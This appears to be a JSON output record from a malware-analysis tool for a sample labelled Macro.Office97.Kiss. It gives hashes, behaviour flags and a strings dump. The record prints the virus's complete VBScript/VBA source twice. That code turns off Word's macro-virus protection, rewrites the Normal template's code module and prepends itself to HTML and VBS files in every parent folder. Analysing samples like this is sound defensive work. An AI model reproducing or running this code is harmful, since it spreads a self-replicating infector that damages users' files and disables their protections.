{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Codemodule": "May attempt to modify the VBA code",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "Document_Close": "Runs when the Word document is closed",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Windows": "May enumerate application windows"
        },
        "macro": "<html><!--kiss-->\n<BODY>\n<script language=\"VBScript\"><!--\n\nPrivate Fso, NT, InfType, HostPath, Target, NextLine, TempFile\n\nPrivate Sub WscriptCode\n   On Error Resume Next\n   HostType = 3\n   HostPath = Wscript.ScriptFullName\n   Call GotoWord\n   Call FindHTMVBS\nEnd Sub\n\nPrivate Sub Window_Onload\n   Dim FSO, CurrentPath, folder, fc, f1\n   If location.protocol = \"file:\" then\n      Set FSO = CreateObject(\"Scripting.FileSystemObject\")\n      HostPath = Replace(location.href, \"file:///\", \"\")\n      HostPath = Replace(HostPath, \"/\", \"\\\")\n      HostType = 2\n      Call GotoWord\n      Call FindHTMVBS\n   End If\nEnd Sub\n\nPrivate Sub GotoWord\n   Set WordObj = CreateObject(\"Word.Application\")\n   Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule\n   If NT.Lines(1,1) <> \"'<html><!--kiss-->\" then\n      WordObj.Options.SaveNormalPrompt = False\n      NT.DeleteLines 1, NT.CountOfLines\n      NT.Addfromfile HostPath\n      NT.DeleteLines 156, (NT.CountOfLines - 155)\n      if HostType = 2 then\n         For j = 1 to 3\n            NT.ReplaceLine j, \"'\" + NT.Lines(j,1)\n         Next\n         For j = 153 to 155\n            NT.ReplaceLine j, \"'\" + NT.Lines(j,1)\n            Next\n      Else\n         NT.ReplaceLine  7, Mid(NT.Lines( 7,1),2)\n         NT.ReplaceLine 13, Mid(NT.Lines(13,1),2)\n      end if\n   End If\n   Set NT = Nothing\n   WordObj.Quit\nEnd Sub\n\nPrivate Sub FindHTMVBS\n   Set FSO = CreateObject(\"Scripting.FileSystemObject\")\n   CurrentPath = fso.GetParentFolderName(HostPath)\n   Set folder = fso.GetFolder(cpath)\n   While folder.IsRootFolder = false\n      Set folder = fso.GetFolder(CurrentPath)\n      Set fc = folder.Files\n      cpath = fso.GetParentFolderName(CurrentPath)\n      For each Target in fc\n         InfExt = Lcase(Fso.GetExtensionName(Target.name)) = \"html\"\n         If (InfExt = \"html\" or InfExt = \"htm\" or InfExt = \"vbs\") AND Target.path <> HostName then\n            Set fh = fso.opentextfile(Target.path, 1, true)\n            TestString = fh.readline\n            fh.close\n            If TestString <> \"<html><!--kiss-->\" AND TestString <> \"'<html><!--kiss-->\" then\n               TempFile = fso.GetTempName\n               fso.CopyFile Target.path, TempFile\n               Set ft = fso.opentextfile(Target.path, 2, true)\n               If HostType = 1 then\n                  For j = 1 to 155\n                      NextLine = NT.Lines (j, 1)\n                      Call CheckLine (j)\n                      ft.Writeline NextLine\n                  Next\n               Else\n                  Set fh = fso.opentextfile(HostPath, 1, true)\n                  For j = 1 to 155\n                      NextLine = fh.ReadLine\n                      Call CheckLine (j)\n                      ft.Writeline NextLine\n                  Next\n                  fh.close\n               End If\n               ft.close\n               Set fh = fso.opentextfile(TempFile, 1, true)\n               Set ft = fso.opentextfile(Target.path, 8, true)\n               Do While fh.AtEndOfStream <> True\n                  ft.WriteLine fh.ReadLine\n               Loop\n               ft.close\n               fh.close\n               fso.DeleteFile TempFile\n            End IF\n         End If\n      Next\n   Wend\nEnd Sub\n\nPrivate Sub CheckLine (LineNumber)\n   If HostType = 1 then\n      If InfType = \"htm\" then\n         If LineNumber < 4 or LineNumber > 152 then\n            NextLine = Mid(NextLine,2)\n         End If\n      Else\n         If LineNumber = 7 or LineNumber = 13 then\n            NextLine = \"'\" + NextLine\n         End If\n      End If\n   Elseif HostType = 2 then\n      If InfType = \"vbs\" then\n         If LineNumber < 4 or LineNumber > 152 then\n            NextLine = \"'\" + NextLine\n         End If\n         If LineNumber = 7 or LineNumber = 13 then\n            NextLine = \"'\" + NextLine\n         End If\n      End If\n   Else\n      If InfType = \"htm\" then\n         If LineNumber < 4 or LineNumber > 152 then\n            NextLine = Mid(NextLine,2)\n         End If\n         If LineNumber = 7 or LineNumber = 13 then\n            NextLine = Mid(NextLine,2)\n         End If\n      End If\n   End If\nEnd Sub\n\nPrivate Sub Document_Close()\n   On Error Resume Next\n   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule\n   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule\n   Options.VirusProtection = False\n   Options.ConfirmConversions = False\n   Options.SaveNormalPrompt = False\n   If NT.Lines(1, 1) <> \"'<html><!--kiss-->\" Then\n      For i = 1 To 155\n         NT.InsertLines i, AD.Lines(i, 1)\n      Next\n   End If\n   If AD.Lines(1, 1) <> \"'<html><!--kiss-->\" Then\n      For i = 1 To 155\n         AD.InsertLines i, NT.Lines(i, 1)\n      Next\n   End If\n   HostType = 1\n   HostPath = \"C:\\Windows\\Web\\Afile.htm\"\n   Call FindHTMVBS\nEnd Sub\n\n--></script>\n</BODY>\n</HTML>\n\n<html>\n<head>\n<title>Macro.Office97.Kiss</title>\n</head>\n<body>\n<p align=\"center\"><strong>Macro.Office97.Kiss</strong></p>\n<p align=\"center\">Thanks to 1nternal</p>\n<p align=\"center\"><a href=\"http://www.avp.ch\">AVP - the best AV</a></p>\n</body>\n</html>"
    },
    "filename": "VirusShare_1a8af549833ed3a4062c3e913daad049",
    "filesize": 5192,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "1a8af549833ed3a4062c3e913daad049",
        "sha1": "a7dc85978f214f184c46ea4deb6040b5424ee3e5",
        "sha256": "8af1ba53914373c5ce2c997456c76013ab634549db7484f5b17340326c835061"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<html><!--kiss-->",
            "<BODY>",
            "<script language=\"VBScript\"><!--",
            "Private Fso, NT, InfType, HostPath, Target, NextLine, TempFile",
            "Private Sub WscriptCode",
            "   On Error Resume Next",
            "   HostType = 3",
            "   HostPath = Wscript.ScriptFullName",
            "   Call GotoWord",
            "   Call FindHTMVBS",
            "End Sub",
            "Private Sub Window_Onload",
            "   Dim FSO, CurrentPath, folder, fc, f1",
            "   If location.protocol = \"file:\" then",
            "      Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
            "      HostPath = Replace(location.href, \"file:///\", \"\")",
            "      HostPath = Replace(HostPath, \"/\", \"\\\")",
            "      HostType = 2",
            "      Call GotoWord",
            "      Call FindHTMVBS",
            "   End If",
            "End Sub",
            "Private Sub GotoWord",
            "   Set WordObj = CreateObject(\"Word.Application\")",
            "   Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule",
            "   If NT.Lines(1,1) <> \"'<html><!--kiss-->\" then",
            "      WordObj.Options.SaveNormalPrompt = False",
            "      NT.DeleteLines 1, NT.CountOfLines",
            "      NT.Addfromfile HostPath",
            "      NT.DeleteLines 156, (NT.CountOfLines - 155)",
            "      if HostType = 2 then",
            "         For j = 1 to 3",
            "            NT.ReplaceLine j, \"'\" + NT.Lines(j,1)",
            "         Next",
            "         For j = 153 to 155",
            "            NT.ReplaceLine j, \"'\" + NT.Lines(j,1)",
            "            Next",
            "      Else",
            "         NT.ReplaceLine  7, Mid(NT.Lines( 7,1),2)",
            "         NT.ReplaceLine 13, Mid(NT.Lines(13,1),2)",
            "      end if",
            "   End If",
            "   Set NT = Nothing",
            "   WordObj.Quit",
            "End Sub",
            "Private Sub FindHTMVBS",
            "   Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
            "   CurrentPath = fso.GetParentFolderName(HostPath)",
            "   Set folder = fso.GetFolder(cpath)",
            "   While folder.IsRootFolder = false",
            "      Set folder = fso.GetFolder(CurrentPath)",
            "      Set fc = folder.Files",
            "      cpath = fso.GetParentFolderName(CurrentPath)",
            "      For each Target in fc",
            "         InfExt = Lcase(Fso.GetExtensionName(Target.name)) = \"html\"",
            "         If (InfExt = \"html\" or InfExt = \"htm\" or InfExt = \"vbs\") AND Target.path <> HostName then",
            "            Set fh = fso.opentextfile(Target.path, 1, true)",
            "            TestString = fh.readline",
            "            fh.close",
            "            If TestString <> \"<html><!--kiss-->\" AND TestString <> \"'<html><!--kiss-->\" then",
            "               TempFile = fso.GetTempName",
            "               fso.CopyFile Target.path, TempFile",
            "               Set ft = fso.opentextfile(Target.path, 2, true)",
            "               If HostType = 1 then",
            "                  For j = 1 to 155",
            "                      NextLine = NT.Lines (j, 1)",
            "                      Call CheckLine (j)",
            "                      ft.Writeline NextLine",
            "                  Next",
            "               Else",
            "                  Set fh = fso.opentextfile(HostPath, 1, true)",
            "                  For j = 1 to 155",
            "                      NextLine = fh.ReadLine",
            "                      Call CheckLine (j)",
            "                      ft.Writeline NextLine",
            "                  Next",
            "                  fh.close",
            "               End If",
            "               ft.close",
            "               Set fh = fso.opentextfile(TempFile, 1, true)",
            "               Set ft = fso.opentextfile(Target.path, 8, true)",
            "               Do While fh.AtEndOfStream <> True",
            "                  ft.WriteLine fh.ReadLine",
            "               Loop",
            "               ft.close",
            "               fh.close",
            "               fso.DeleteFile TempFile",
            "            End IF",
            "         End If",
            "      Next",
            "   Wend",
            "End Sub",
            "Private Sub CheckLine (LineNumber)",
            "   If HostType = 1 then",
            "      If InfType = \"htm\" then",
            "         If LineNumber < 4 or LineNumber > 152 then",
            "            NextLine = Mid(NextLine,2)",
            "         End If",
            "      Else",
            "         If LineNumber = 7 or LineNumber = 13 then",
            "            NextLine = \"'\" + NextLine",
            "         End If",
            "      End If",
            "   Elseif HostType = 2 then",
            "      If InfType = \"vbs\" then",
            "         If LineNumber < 4 or LineNumber > 152 then",
            "            NextLine = \"'\" + NextLine",
            "         End If",
            "         If LineNumber = 7 or LineNumber = 13 then",
            "            NextLine = \"'\" + NextLine",
            "         End If",
            "      End If",
            "   Else",
            "      If InfType = \"htm\" then",
            "         If LineNumber < 4 or LineNumber > 152 then",
            "            NextLine = Mid(NextLine,2)",
            "         End If",
            "         If LineNumber = 7 or LineNumber = 13 then",
            "            NextLine = Mid(NextLine,2)",
            "         End If",
            "      End If",
            "   End If",
            "End Sub",
            "Private Sub Document_Close()",
            "   On Error Resume Next",
            "   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule",
            "   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule",
            "   Options.VirusProtection = False",
            "   Options.ConfirmConversions = False",
            "   Options.SaveNormalPrompt = False",
            "   If NT.Lines(1, 1) <> \"'<html><!--kiss-->\" Then",
            "      For i = 1 To 155",
            "         NT.InsertLines i, AD.Lines(i, 1)",
            "      Next",
            "   End If",
            "   If AD.Lines(1, 1) <> \"'<html><!--kiss-->\" Then",
            "      For i = 1 To 155",
            "         AD.InsertLines i, NT.Lines(i, 1)",
            "      Next",
            "   End If",
            "   HostType = 1",
            "   HostPath = \"C:\\Windows\\Web\\Afile.htm\"",
            "   Call FindHTMVBS",
            "End Sub",
            "--></script>",
            "</BODY>",
            "</HTML>",
            "<html>",
            "<head>",
            "<title>Macro.Office97.Kiss</title>",
            "</head>",
            "<body>",
            "<p align=\"center\"><strong>Macro.Office97.Kiss</strong></p>",
            "<p align=\"center\">Thanks to 1nternal</p>",
            "<p align=\"center\"><a href=\"http://www.avp.ch\">AVP - the best AV</a></p>",
            "</body>",
            "</html>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.avp.ch",
            "file:///"
        ]
    },
    "time": "0:00:00.287144",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
